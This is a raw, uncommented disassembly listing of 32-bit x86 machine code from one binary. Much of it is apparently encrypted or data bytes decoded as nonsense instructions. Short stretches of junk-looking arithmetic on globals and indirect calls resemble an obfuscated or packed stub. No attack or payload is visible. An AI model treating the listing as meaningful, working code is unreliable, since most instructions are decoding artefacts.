  402af0:	jbe    0x402afd
  402af2:	mov    ah,BYTE PTR [eax]
  402af4:	add    edi,DWORD PTR [eax+0x38dc8053]
  402afa:	jmp    0x402ad5
  402afc:	or     eax,0x92c693e5
  402b01:	and    ebx,0xffffffc1
  402b04:	outs   dx,DWORD PTR ds:[esi]
  402b05:	ret    0xdc02
  402b08:	fs cdq 
  402b0a:	pop    es
  402b0b:	push   ebx
  402b0c:	imul   esp,eax,0x4a1f596a
  402b12:	add    eax,0x10b295e4
  402b17:	not    BYTE PTR [edi]
  402b19:	push   ecx
  402b1a:	mov    ds:0x8a6170a7,eax
  402b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b20:	aas    
  402b21:	pop    eax
  402b22:	jp     0x402b9a
  402b24:	loope  0x402ad6
  402b26:	sahf   
  402b27:	imul   ebx,DWORD PTR ds:0x6f3dc6cc,0x9ad7892e
  402b31:	stc    
  402b32:	shl    BYTE PTR ds:0xb69af06e,cl
  402b38:	ins    BYTE PTR es:[edi],dx
  402b39:	outs   dx,DWORD PTR ds:[esi]
  402b3a:	cmp    edx,DWORD PTR [ebx+0x53]
  402b3d:	pop    esi
  402b3e:	and    edx,ebp
  402b40:	arpl   WORD PTR [edx-0x69934344],sp
  402b46:	enter  0x9bae,0x20
  402b4a:	dec    ecx
  402b4b:	iret   
  402b4c:	adc    DWORD PTR [esi+eiz*1+0x1b],ebp
  402b50:	lds    esp,FWORD PTR [edi-0x5d]
  402b53:	dec    edx
  402b54:	(bad)  
  402b55:	and    DWORD PTR [ecx+0x6d],esi
  402b58:	push   esp
  402b59:	inc    ecx
  402b5a:	in     eax,dx
  402b5b:	ret    0x1b37
  402b5e:	in     eax,dx
  402b5f:	xchg   ecx,eax
  402b60:	sbb    eax,0x976abde1
  402b65:	dec    esp
  402b66:	jno    0x402b36
  402b68:	les    ebx,FWORD PTR [edi-0x2097afaf]
  402b6e:	or     eax,0x1d810000
  402b73:	xchg   edi,eax
  402b74:	add    DWORD PTR [edx+0x0],0xffffffe0
  402b78:	inc    ecx
  402b79:	add    BYTE PTR [eax],al
  402b7b:	push   0x2d0f
  402b80:	call   0x42206a
  402b85:	mov    ecx,DWORD PTR [ebp-0x68]
  402b88:	not    edx
  402b8a:	mov    edx,DWORD PTR [ebp-0x64]
  402b8d:	cmp    DWORD PTR ds:0x428283,0x0
  402b94:	mov    edx,DWORD PTR ds:0x428397
  402b9a:	mov    DWORD PTR ds:0x42818f,0x2873
  402ba4:	movzx  edx,WORD PTR ds:0x428233
  402bab:	jmp    0x402c06
  402bb0:	mov    DWORD PTR ds:0x42830b,ebx
  402bb6:	cmp    DWORD PTR ds:0x428283,0x0
  402bbd:	jb     0x402be8
  402bc3:	push   DWORD PTR [ebp-0x1c]
  402bc6:	call   DWORD PTR ds:0x428d84
  402bcc:	mov    edx,DWORD PTR ds:0x428293
  402bd2:	add    DWORD PTR ds:0x42826b,edx
  402bd8:	mov    DWORD PTR ds:0x42830f,0x7648
  402be2:	adc    edx,DWORD PTR ds:0x42824b
  402be8:	mov    edx,DWORD PTR ds:0x42831b
  402bee:	sbb    DWORD PTR ds:0x4282a7,edx
  402bf4:	mov    edx,DWORD PTR ds:0x428263
  402bfa:	xor    DWORD PTR ds:0x428327,edx
  402c00:	and    edx,DWORD PTR ds:0x4282ff
  402c06:	xor    eax,ecx
  402c08:	mov    ecx,DWORD PTR [ebp-0x70]
  402c0b:	xor    edx,0x594e
  402c11:	mov    edx,DWORD PTR [ebp-0x6c]
  402c14:	add    DWORD PTR ds:0x42822b,0x7b5b
  402c1e:	sub    eax,ecx
  402c20:	mov    ecx,DWORD PTR ds:0x4281d3
  402c26:	mov    ecx,DWORD PTR [ecx]
  402c28:	and    DWORD PTR ds:0x42825b,ecx
  402c2e:	mov    ecx,DWORD PTR ds:0x422588
  402c34:	or     DWORD PTR ds:0x428153,0x509d
  402c3e:	lea    eax,[eax+ecx*1-0x27d2]
  402c45:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c48:	mov    edx,DWORD PTR [ebp-0x2c]
  402c4b:	sbb    DWORD PTR ds:0x4282fb,0x9f0
  402c55:	or     ecx,0x4f00
  402c5b:	add    DWORD PTR ds:0x42838f,0x42836b
  402c65:	jmp    0x403043
  402c6a:	nop
  402c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6c:	(bad)  
  402c6d:	call   0x1caec68c
  402c72:	int    0x3e
  402c74:	cmp    DWORD PTR [edi+eiz*8-0x4a],0xffffffeb
  402c79:	mov    esi,0x1818f4b6
  402c7e:	sahf   
  402c7f:	adc    bl,BYTE PTR [eax]
  402c81:	sbb    BYTE PTR [eax-0x2607969b],cl
  402c87:	cmp    esi,DWORD PTR [eax+edx*2+0x2b236065]
  402c8e:	mov    esp,0x7d71c64b
  402c93:	jnp    0x402c99
  402c95:	repnz fist DWORD PTR [edi]
  402c98:	shr    DWORD PTR [ecx-0x6b],0xc9
  402c9c:	scas   al,BYTE PTR es:[edi]
  402c9d:	pusha  
  402c9e:	sub    ebp,ecx
  402ca0:	mov    edi,0xf43623a4
  402ca5:	sub    eax,esp
  402ca7:	std    
  402ca8:	std    
  402ca9:	push   0xffffffc0
  402cab:	adc    eax,0x1cbcc7e0
  402cb0:	(bad)  
  402cb1:	mov    bl,0x81
  402cb3:	div    bl
  402cb5:	jecxz  0x402c78
  402cb7:	cmp    eax,esi
  402cb9:	pcmpeqw mm0,QWORD PTR [ebx-0x212fccbe]
  402cc0:	sahf   
  402cc1:	mov    ebp,0xf905565e
  402cc6:	jae    0x402ce0
  402cc8:	pushf  
  402cc9:	mov    ds:0x186e7fe7,al
  402cce:	aad    0x49
  402cd0:	stos   BYTE PTR es:[edi],al
  402cd1:	stos   DWORD PTR es:[edi],eax
  402cd2:	jecxz  0x402cc6
  402cd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cd5:	xor    BYTE PTR [esi+esi*8],al
  402cd8:	pop    edi
  402cd9:	cmc    
  402cda:	mov    ecx,0x3456d58a
  402cdf:	icebp  
  402ce0:	into   
  402ce1:	sub    esi,ebx
  402ce3:	pop    ds
  402ce4:	or     cl,BYTE PTR [eax+0x4f4241b3]
  402cea:	mov    bl,0x61
  402cec:	lods   al,BYTE PTR ds:[esi]
  402ced:	dec    eax
  402cee:	ja     0x402cd9
  402cf0:	pop    ds
  402cf1:	mov    dh,0xb8
  402cf3:	mov    ds:0xb4eb219f,al
  402cf8:	push   cs
  402cf9:	and    al,0x96
  402cfb:	xchg   edi,eax
  402cfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cfd:	fnstsw WORD PTR [eax]
  402cff:	retf   
  402d00:	push   esi
  402d01:	das    
  402d02:	xor    ch,bh
  402d04:	bound  edx,QWORD PTR [esi+0x70]
  402d07:	out    0x96,eax
  402d09:	in     eax,dx
  402d0a:	in     eax,dx
  402d0b:	(bad)  
  402d0c:	jns    0x402d84
  402d0e:	mov    es,WORD PTR [esi+0x54bb9a64]
  402d14:	mov    bh,BYTE PTR [edi+0x4c61b20c]
  402d1a:	mov    ebp,0x1ffa295d
  402d1f:	add    eax,0x5567297c
  402d24:	pushf  
  402d25:	push   0x93f4206e
  402d2a:	inc    ebx
  402d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d2c:	pop    ebx
  402d2d:	cmp    DWORD PTR [ebx],ecx
  402d2f:	mov    al,ds:0x3e367912
  402d34:	fidivr WORD PTR [edi+0x12b577a9]
  402d3a:	not    BYTE PTR [esi]
  402d3c:	sbb    dl,BYTE PTR [ecx+0x65]
  402d3f:	ret    0x4502
  402d42:	mov    ebp,0xb4ff5ab
  402d47:	push   edx
  402d48:	fsubrp st(3),st
  402d4a:	mov    esi,DWORD PTR [ebx-0x5c]
  402d4d:	iret   
  402d4e:	push   ecx
  402d4f:	clc    
  402d50:	xchg   esp,eax
  402d51:	cli    
  402d52:	xor    DWORD PTR [edi-0x364353ef],edx
  402d58:	adc    BYTE PTR [ecx],bl
  402d5a:	fcmovnbe st,st(1)
  402d5c:	imul   si,WORD PTR [esi+0x16],0xfff3
  402d61:	jns    0x402d38
  402d63:	jns    0x402dc3
  402d65:	jne    0x402d1c
  402d67:	xchg   DWORD PTR [edx-0x73d188bb],ecx
  402d6d:	mov    bl,0x0
  402d6f:	rcl    bh,1
  402d71:	pop    DWORD PTR [edi]
  402d73:	shl    dl,0x36
  402d76:	retf   0xfa5
  402d79:	pushf  
  402d7a:	lods   eax,DWORD PTR ds:[esi]
  402d7b:	or     ecx,eax
  402d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d7e:	or     bl,BYTE PTR [ecx+0x41ce2017]
  402d84:	std    
  402d85:	sti    
  402d86:	in     eax,dx
  402d87:	mov    edi,0x4446b359
  402d8c:	out    dx,eax
  402d8d:	dec    eax
  402d8e:	mov    al,0xe1
  402d90:	aaa    
  402d91:	push   es
  402d92:	sbb    DWORD PTR [esi-0x1ff151e9],esi
  402d98:	bnd ret 
  402d9a:	cli    
  402d9b:	push   esp
  402d9c:	in     al,dx
  402d9d:	das    
  402d9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402da0:	mov    esi,0x7d9f11b0
  402da5:	ret    0x5e98
  402da8:	adc    ebp,ebx
  402daa:	xchg   ebx,eax
  402dab:	mov    bh,bl
  402dad:	pop    edx
  402dae:	(bad)  
  402daf:	std    
  402db0:	or     DWORD PTR [eax-0x173909b8],0x59131595
  402dba:	jl     0x402da6
  402dbc:	xor    al,0x39
  402dbe:	inc    edx
  402dbf:	dec    edx
  402dc0:	ds shr bh,cl
  402dc3:	adc    ah,BYTE PTR [ecx+0x1118290b]
  402dc9:	xabort 0x77
  402dcc:	scas   eax,DWORD PTR es:[edi]
  402dcd:	push   ebx
  402dce:	repz and eax,0x8d994f6d
  402dd4:	cmp    al,BYTE PTR [ebx]
  402dd6:	push   edi
  402dd7:	ins    BYTE PTR es:[edi],dx
  402dd8:	pop    esp
  402dd9:	daa    
  402dda:	sub    BYTE PTR [edx+0x69171650],dl
  402de0:	daa    
  402de1:	out    dx,eax
  402de2:	int    0x8c
  402de4:	pop    edi
  402de5:	out    dx,al
  402de6:	(bad)  
  402de8:	xor    ah,BYTE PTR [eax+edi*2+0x7f]
  402dec:	mov    bl,0xba
  402dee:	dec    esp
  402def:	rol    DWORD PTR [edx+0xeaa95f1],0x0
  402df6:	(bad)  
  402df7:	mov    ecx,0xc0e4ed17
  402dfc:	fadd   st,st(3)
  402dfe:	pop    esi
  402dff:	fmul   DWORD PTR ds:0x23eb4c28
  402e05:	mov    esp,0xc0d8e22f
  402e0a:	xor    BYTE PTR [ecx+0x26],ch
  402e0d:	dec    ebp
  402e0e:	xlat   BYTE PTR ds:[ebx]
  402e0f:	sbb    ebx,DWORD PTR [ebx]
  402e11:	and    bl,bl
  402e13:	xor    BYTE PTR [ebx],dl
  402e15:	or     al,BYTE PTR [edx]
  402e17:	xchg   DWORD PTR [esi+ebp*1],ebx
  402e1a:	repz js 0x402e41
  402e1d:	or     DWORD PTR [esp+eiz*4-0x4031ffed],edx
  402e24:	pop    edx
  402e25:	bnd ja 0x402e49
  402e28:	ins    BYTE PTR es:[edi],dx
  402e29:	fld    DWORD PTR [ebx]
  402e2b:	shr    BYTE PTR [edi+0x5eed42a5],0xbd
  402e32:	xor    dl,BYTE PTR [edi-0x4597ff36]
  402e38:	pop    es
  402e39:	pop    ss
  402e3a:	mov    al,0xb0
  402e3c:	fbstp  TBYTE PTR [edx+0x29c20f49]
  402e42:	and    ah,BYTE PTR [ecx-0x53]
  402e45:	adc    BYTE PTR [ecx],bl
  402e47:	xor    eax,0x7a0e3156
  402e4c:	cmp    eax,0xf9970321
  402e51:	cwde   
  402e52:	or     BYTE PTR [eax-0x44e38164],ah
  402e58:	imul   edi,DWORD PTR [ecx],0x8d40d110
  402e5e:	sti    
  402e5f:	sub    al,ah
  402e61:	cld    
  402e62:	mov    ch,0xe9
  402e64:	push   ds
  402e65:	std    
  402e66:	mov    ecx,DWORD PTR [edi+edx*4-0x3d715d03]
  402e6d:	adc    al,0xea
  402e6f:	xchg   ebp,eax
  402e70:	mov    al,0x67
  402e72:	jp     0x402eb6
  402e74:	jne    0x402e8e
  402e76:	daa    
  402e77:	xchg   edi,eax
  402e78:	sub    al,0x9a
  402e7a:	pop    ebp
  402e7b:	xor    ebp,DWORD PTR [edx+0x64844929]
  402e81:	lahf   
  402e82:	xchg   DWORD PTR [edi+esi*1],ebp
  402e85:	push   es
  402e86:	cli    
  402e87:	js     0x402e71
  402e89:	push   ebx
  402e8a:	fwait
  402e8b:	adc    eax,DWORD PTR [ecx-0x41317cff]
  402e91:	repnz mov ah,0x12
  402e94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e95:	push   es
  402e96:	or     DWORD PTR [edx+0x1428dcf1],0x5
  402e9d:	inc    esi
  402e9e:	pop    eax
  402e9f:	repz mov edi,0xe49c6b4c
  402ea5:	in     eax,dx
  402ea6:	fst    st(5)
  402ea8:	dec    edi
  402ea9:	inc    ebp
  402eaa:	pop    edi
  402eab:	xchg   esi,eax
  402eac:	imul   esp,DWORD PTR [ebp+eiz*2-0x79],0xeca75071
  402eb4:	add    DWORD PTR [esi+0xd94773e],0xfffffff4
  402ebb:	stc    
  402ebc:	popa   
  402ebd:	in     eax,0xfb
  402ebf:	inc    ebx
  402ec0:	sbb    al,0x33
  402ec2:	sub    eax,DWORD PTR ds:0x16864240
  402ec8:	inc    ecx
  402ec9:	(bad)  
  402eca:	call   0x620d8468
  402ecf:	add    al,0xfd
  402ed1:	xchg   esp,eax
  402ed2:	add    esi,DWORD PTR [eax+edi*8-0x2c]
  402ed6:	imul   ebp,DWORD PTR [edx],0x0
  402ed9:	push   cs
  402eda:	test   DWORD PTR [ecx+0x55c3d0a6],esp
  402ee0:	jb     0x402ef0
  402ee2:	xor    al,0xf1
  402ee4:	nop
  402ee5:	es sbb BYTE PTR gs:[edi+0x68ad815e],ah
  402eed:	pop    ss
  402eee:	int3   
  402eef:	cmp    al,ah
  402ef1:	adc    DWORD PTR [edx-0x53],ecx
  402ef4:	jnp    0x402f71
  402ef6:	lahf   
  402ef7:	add    bh,0xd2
  402efa:	cdq    
  402efb:	xor    al,0x23
  402efd:	fild   WORD PTR [eax+0x26]
  402f00:	jge    0x402f66
  402f02:	sahf   
  402f03:	xchg   ebp,eax
  402f04:	shl    BYTE PTR [edx-0x50ff1306],1
  402f0a:	cmp    DWORD PTR [ebp-0x54],ecx
  402f0d:	and    ebx,DWORD PTR [eax]
  402f0f:	cdq    
  402f10:	xor    DWORD PTR es:[ecx],esi
  402f13:	and    eax,0xc4e1d9cb
  402f18:	icebp  
  402f19:	sbb    dh,dh
  402f1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f1c:	mov    dh,ch
  402f1e:	jnp    0x402ef5
  402f20:	push   eax
  402f21:	daa    
  402f22:	pop    ebx
  402f23:	xor    eax,0xe195c15e
  402f28:	enter  0x482a,0x65
  402f2c:	daa    
  402f2d:	(bad)  
  402f2e:	in     al,dx
  402f2f:	mov    dh,BYTE PTR [ecx-0x771343f5]
  402f35:	pop    edx
  402f36:	adc    al,0xd3
  402f38:	loope  0x402f54
  402f3a:	jbe    0x402f93
  402f3c:	lods   al,BYTE PTR ds:[esi]
  402f3d:	loope  0x402f8b
  402f3f:	pop    ebx
  402f40:	aad    0x3c
  402f42:	xchg   dh,cl
  402f44:	adc    BYTE PTR [esp+esi*2-0x206ef3ef],cl
  402f4b:	pop    edi
  402f4c:	nop
  402f4d:	xchg   ebx,eax
  402f4e:	rol    DWORD PTR [esi+0x450778ac],cl
  402f54:	dec    edx
  402f55:	mov    edx,0xc9d4c960
  402f5a:	dec    eax
  402f5b:	aad    0x2c
  402f5d:	jmp    0x85c9c199
  402f62:	inc    ebx
  402f63:	test   BYTE PTR [edx+ebp*8-0x6],0x3f
  402f68:	mov    al,0x91
  402f6a:	jns    0x402f84
  402f6c:	xchg   edi,eax
  402f6d:	dec    ebp
  402f6e:	std    
  402f6f:	aas    
  402f70:	lahf   
  402f71:	xor    DWORD PTR [edi-0xe9b0efe],0xffffff8e
  402f78:	sub    DWORD PTR [esi+0x6287789d],ebp
  402f7e:	add    al,0x64
  402f80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f81:	push   edx
  402f82:	xchg   BYTE PTR [edx-0x3],bl
  402f85:	jb     0x402f6c
  402f87:	mov    esi,0xe55d1624
  402f8c:	add    al,0x8d
  402f8e:	push   ebp
  402f8f:	icebp  
  402f90:	mov    eax,0x9fdcf3f2
  402f95:	add    ah,BYTE PTR [edi+0x11]
  402f98:	sub    bl,BYTE PTR [edi]
  402f9a:	pop    edi
  402f9b:	mov    dh,0x6b
  402f9d:	jge    0x402f6e
  402f9f:	xlat   BYTE PTR ds:[ebx]
  402fa0:	sbb    BYTE PTR ds:0x660af117,bh
  402fa6:	push   0x78fd2258
  402fab:	ror    BYTE PTR [ebx+ecx*8+0x356888d2],1
  402fb2:	cmp    ah,ch
  402fb4:	div    DWORD PTR [ecx]
  402fb6:	dec    ecx
  402fb7:	stos   BYTE PTR es:[edi],al
  402fb8:	pop    esp
  402fb9:	ins    BYTE PTR es:[edi],dx
  402fba:	xchg   BYTE PTR [eax],ch
  402fbc:	mov    BYTE PTR [ebp-0x79],dl
  402fbf:	in     al,dx
  402fc0:	or     eax,DWORD PTR [edi+0x71ea5e15]
  402fc6:	xor    DWORD PTR [ebx-0x3e51105c],0xff615e92
  402fd0:	ret    
  402fd1:	jmp    0x94545c85
  402fd6:	nop
  402fd7:	mov    bl,0x0
  402fd9:	dec    ecx
  402fda:	mov    WORD PTR [ebx],ss
  402fdc:	loopne 0x402fc1
  402fde:	sub    dl,BYTE PTR [eax]
  402fe0:	add    eax,0x3a65cb7a
  402fe5:	inc    esp
  402fe6:	ficom  DWORD PTR [ebp-0x437da8bc]
  402fec:	dec    ebx
  402fed:	in     al,0x15
  402fef:	push   cs
  402ff0:	ss out dx,eax
  402ff2:	push   ecx
  402ff3:	jo     0x403002
  402ff5:	cmp    al,0x28
  402ff7:	fild   QWORD PTR [edi-0x5a]
  402ffa:	xchg   BYTE PTR [esp+ebx*4+0x3b05189c],ah
  403001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403002:	sub    BYTE PTR [edx+0x62],cl
  403005:	mov    ebx,0x3f241d6
  40300a:	pushf  
  40300b:	int    0x14
  40300d:	push   es
  40300e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40300f:	sti    
  403010:	add    al,0x2d
  403012:	mov    dl,BYTE PTR [edx]
  403014:	mov    es,ebx
  403016:	xchg   ecx,eax
  403017:	not    DWORD PTR [ebx-0x452a24d2]
  40301d:	and    bl,bl
  40301f:	or     DWORD PTR [esi+eiz*2+0x3],0x503659ae
  403027:	loopne 0x403019
  403029:	into   
  40302a:	jge    0x40305e
  40302c:	aaa    
  40302d:	dec    ecx
  40302e:	jle    0x403088
  403030:	mov    al,ds:0x89ab9f9f
  403035:	(bad)  
  403036:	ficom  WORD PTR [ecx+0x1ccf80d]
  40303c:	pop    edx
  40303d:	push   0xa4f9b1a0
  403042:	jo     0x403067
  403044:	retf   0xc281
  403047:	arpl   WORD PTR [eax+eax*1],si
  40304a:	add    BYTE PTR [ebx-0x35f433ab],cl
  403050:	xor    ecx,0x5fdd
  403056:	cmp    ecx,DWORD PTR [eax]
  403058:	mov    DWORD PTR ds:0x42829b,0x665d
  403062:	jne    0x40a9b0
  403068:	mov    ecx,DWORD PTR [esi]
  40306a:	cmp    DWORD PTR ds:0x42839f,0x0
  403071:	mov    DWORD PTR ds:0x4283a3,edx
  403077:	mov    DWORD PTR ds:0x4282eb,0x1413
  403081:	mov    edx,DWORD PTR ds:0x428393
  403087:	jmp    0x4030db
  40308c:	mov    DWORD PTR ds:0x42815f,0x4beb
  403096:	not    eax
  403098:	cmp    DWORD PTR ds:0x42839f,0x0
  40309f:	jl     0x4030c1
  4030a5:	push   DWORD PTR [ebp-0x20]
  4030a8:	push   DWORD PTR [ebp-0xc]
  4030ab:	call   DWORD PTR ds:0x428da4
  4030b1:	mov    DWORD PTR ds:0x42824b,0x4e29
  4030bb:	inc    DWORD PTR ds:0x42826f
  4030c1:	or     edx,DWORD PTR ds:0x42830b
  4030c7:	add    edx,DWORD PTR ds:0x42818f
  4030cd:	sub    edx,edx
  4030cf:	add    DWORD PTR ds:0x428397,edx
  4030d5:	sbb    edx,DWORD PTR ds:0x42831f
  4030db:	mov    eax,DWORD PTR [esi+0x4]
  4030de:	sbb    edx,DWORD PTR ds:0x428383
  4030e4:	shrd   ecx,eax,0x2
  4030e8:	shr    eax,0x2
  4030eb:	mov    eax,DWORD PTR [esi]
  4030ed:	xor    DWORD PTR ds:0x4283a3,edx
  4030f3:	mov    edx,DWORD PTR [esi+0x4]
  4030f6:	neg    DWORD PTR ds:0x42815b
  4030fc:	shl    eax,0x1e
  4030ff:	xor    ecx,edi
  403101:	xor    eax,eax
  403103:	sbb    DWORD PTR ds:0x4283a7,0x1e67
  40310d:	or     eax,ecx
  40310f:	jmp    0x4034ed
  403114:	and    al,0xd6
  403116:	push   esp
  403117:	repnz and dh,BYTE PTR [ebx+0x22]
  40311b:	inc    esi
  40311c:	sar    BYTE PTR [eax-0x73],1
  40311f:	jo     0x40314b
  403121:	js     0x403137
  403123:	stos   BYTE PTR es:[edi],al
  403124:	cmp    eax,0x9e1818ec
  403129:	adc    bl,BYTE PTR [eax]
  40312b:	sbb    BYTE PTR [ecx],bh
  40312d:	pop    esi
  40312e:	(bad)  
  40312f:	sub    DWORD PTR [ecx],esi
  403131:	pusha  
  403132:	mov    dh,BYTE PTR [eax+eiz*8-0x57]
  403136:	in     eax,0x7c
  403138:	jmp    0xa2f44348
  40313d:	cwde   
  40313e:	mov    edx,0xa0d3b5c8
  403143:	data16 or ch,BYTE PTR [esi+0x1b]
  403147:	mov    ebx,0x7977d286
  40314c:	test   BYTE PTR [ebx-0x69ba8e5f],dl
  403152:	nop
  403153:	cwde   
  403154:	mov    BYTE PTR [eax+edx*1],dl
  403157:	dec    ebx
  403158:	jae    0x4030e8
  40315a:	pop    DWORD PTR [ecx+ebp*1]
  40315d:	ins    BYTE PTR es:[edi],dx
  40315e:	pop    ds
  40315f:	xchg   ebx,eax
  403160:	sbb    al,BYTE PTR [esi]
  403162:	lea    ebp,[edi-0x4b]
  403165:	cmp    eax,0x4bed56a8
  40316a:	jb     0x403165
  40316c:	and    BYTE PTR [ebx+edx*1+0x2f1c5d1e],ah
  403173:	add    al,0xc6
  403175:	lss    ebp,FWORD PTR ds:0xc67f0082
  40317c:	cmc    
  40317d:	in     al,0x91
  40317f:	inc    ebp
  403180:	test   al,0xf7
  403182:	out    dx,al
  403183:	xchg   ecx,eax
  403184:	xchg   ebp,eax
  403185:	jmp    0xa44b:0x44bc889b
  40318c:	(bad)  
  40318d:	cli    
  40318e:	xchg   esi,eax
  40318f:	gs je  0x40311b
  403192:	leave  
  403193:	mov    bl,dl
  403195:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403196:	mov    ch,0x5f
  403198:	xchg   ebx,eax
  403199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40319a:	inc    eax
  40319b:	and    eax,0xb534a507
  4031a0:	xor    dx,bx
  4031a3:	adc    eax,DWORD PTR [esi]
  4031a5:	push   eax
  4031a6:	xor    DWORD PTR [ebp-0x5c],ebp
  4031a9:	mov    dh,BYTE PTR ds:0xf7ba1c78
  4031af:	mov    edi,DWORD PTR es:[ebp-0x24cbb15c]
  4031b6:	leave  
  4031b7:	xor    al,0xef
  4031b9:	std    
  4031ba:	inc    esi
  4031bb:	fldenv [ebx-0x275c0436]
  4031c1:	push   esp
  4031c2:	pushf  
  4031c3:	push   0xffffff9c
  4031c5:	mov    ebp,0x92a509bb
  4031ca:	in     al,dx
  4031cb:	sbb    eax,0x23e82dbe
  4031d0:	dec    eax
  4031d1:	(bad)  
  4031d3:	jmp    0x26eca0cd
  4031d8:	jge    0x4031ff
  4031da:	mov    bh,0xab
  4031dc:	sbb    DWORD PTR ds:0x608b694b,0xffffff87
  4031e3:	cld    
  4031e4:	jmp    0x6ac7b8f0
  4031e9:	add    ebx,DWORD PTR [ebp+edi*1+0xf1e9f47]
  4031f0:	sub    al,0x3e
  4031f2:	adc    al,ch
  4031f4:	mov    eax,ds:0x53715953
  4031f9:	out    dx,eax
  4031fa:	outs   dx,BYTE PTR ds:[esi]
  4031fb:	(bad)  
  4031fc:	push   0xe
  4031fe:	fcmovnu st,st(7)
  403200:	nop
  403201:	pop    eax
  403202:	mul    BYTE PTR [eax]
  403204:	lahf   
  403205:	ins    DWORD PTR es:[edi],dx
  403206:	pushf  
  403207:	imul   edx,esp,0x6a
  40320a:	mov    edi,0x76bb8529
  40320f:	retf   
  403210:	arpl   WORD PTR [edx+ebx*2+0x721b1b61],bx
  403217:	nop
  403218:	paddq  mm4,mm1
  40321b:	(bad)  
  40321c:	hlt    
  40321d:	or     esp,DWORD PTR [eax+eax*8+0x34]
  403221:	lea    esp,[ebx-0x45]
  403224:	ss sbb ecx,ecx
  403227:	inc    ecx
  403228:	dec    eax
  403229:	mov    edi,0xf4b152f8
  40322e:	push   ss
  40322f:	adc    al,0xe9
  403231:	xor    ch,ah
  403233:	xchg   DWORD PTR [esi+ebx*2+0x4c],esp
  403237:	hlt    
  403238:	jne    0x403203
  40323a:	xor    ch,bl
  40323c:	out    0xb0,al
  40323e:	(bad)  
  40323f:	mov    bl,0xc0
  403241:	data16 rol BYTE PTR [ebx-0x3],1
  403245:	enter  0x1920,0xaf
  403249:	cdq    
  40324a:	pop    ebp
  40324b:	sbb    BYTE PTR [eax-0x3e316081],0x1e
  403252:	(bad)  
  403254:	imul   ebp,DWORD PTR [edx-0x19953880],0xffffff9c
  40325b:	loop   0x403203
  40325d:	mov    ch,0xca
  40325f:	fsub   QWORD PTR [ebx-0x58]
  403262:	jb     0x4032ab
  403264:	das    
  403265:	mov    ah,0x22
  403267:	into   
  403268:	sub    DWORD PTR [edx-0x24],0x479a7554
  40326f:	add    esp,DWORD PTR [ebp+0x78]
  403272:	sbb    BYTE PTR [ebx-0x5a],ch
  403275:	jno    0x403292
  403277:	cs pop esp
  403279:	mov    BYTE PTR [edi+ebx*8+0x20],dl
  40327d:	and    ebp,DWORD PTR [ecx]
  40327f:	cli    
  403280:	fwait
  403281:	and    al,0xc6
  403283:	shr    BYTE PTR [edx],0xc6
  403286:	and    ah,al
  403288:	cmp    BYTE PTR [ebx+0x22],al
  40328b:	mov    ch,0x25
  40328d:	sub    al,0x1
  40328f:	push   ebp
  403290:	fst    st(6)
  403292:	sub    eax,0x69ba26a
  403297:	xchg   ebx,eax
  403298:	ret    
  403299:	sbb    DWORD PTR [edi+0xe],ebp
  40329c:	jp     0x2c77c2e2
  4032a2:	retf   
  4032a3:	imul   esp,DWORD PTR [esi+0x48],0xffffffb1
  4032a7:	mov    DWORD PTR [edx-0x7bc16a3d],ebp
  4032ad:	in     eax,dx
  4032ae:	call   0xc55b:0xa54bf2d5
  4032b5:	push   0x3e64f253
  4032ba:	fisubr DWORD PTR [edx+0x36]
  4032bd:	fnstcw WORD PTR [ebp+eax*2+0x2f590f22]
  4032c4:	fld    TBYTE PTR [esi+0x6184136a]
  4032ca:	arpl   WORD PTR [ebx+0x15825f95],dx
  4032d0:	pop    ecx
  4032d1:	out    0x18,eax
  4032d3:	test   eax,0x6e40912
  4032d8:	rcpps  xmm4,xmm1
  4032db:	repz or al,0x43
  4032de:	fldenv [edx-0x4c]
  4032e1:	ins    BYTE PTR es:[di],dx
  4032e3:	jnp    0x403325
  4032e5:	jne    0x4032b0
  4032e7:	rcr    BYTE PTR [ebp+edi*4-0x61faec12],0x83
  4032ef:	fistp  DWORD PTR [ecx+edi*1-0x70]
  4032f3:	dec    eax
  4032f4:	sbb    DWORD PTR [ebp-0x6c],0xdeca74cf
  4032fb:	addr16 jl 0x403305
  4032fe:	adc    esp,DWORD PTR ds:0x3ccf47a5
  403304:	push   0x11
  403306:	lods   eax,DWORD PTR ds:[esi]
  403307:	dec    ebx
  403308:	es jecxz 0x403313
  40330b:	int3   
  40330c:	cbw    
  40330e:	(bad)  
  40330f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403310:	adc    DWORD PTR [edx+0x3b],edi
  403313:	jl     0x40329c
  403315:	jle    0x403347
  403317:	arpl   WORD PTR [edx],si
  403319:	shl    BYTE PTR [ecx-0x709b64b],cl
  40331f:	pop    ebp
  403320:	retf   
  403321:	lock dec eax
  403323:	cmp    DWORD PTR [esi],0x8ad730c7
  403329:	pop    ebx
  40332a:	mov    bh,al
  40332c:	add    BYTE PTR [edx-0x5d],0x70
  403330:	or     DWORD PTR [edx],ecx
  403332:	mov    eax,0xa0f4aca1
  403337:	aam    0xf2
  403339:	js     0x4032f5
  40333b:	jmp    edx
  40333d:	mov    ecx,DWORD PTR [esi+0x47]
  403340:	and    DWORD PTR [edx],0x78
  403343:	stos   DWORD PTR es:[edi],eax
  403344:	add    DWORD PTR [ebp+0x54],ebp
  403347:	mov    edx,0x5de57145
  40334c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40334d:	inc    ebx
  40334e:	sub    edi,DWORD PTR [bp-0x2f0e]
  403353:	mov    bl,0x28
  403355:	repnz imul esp,DWORD PTR [ebp+0x4828edb],0x79
  40335d:	sub    dh,bh
  40335f:	dec    edi
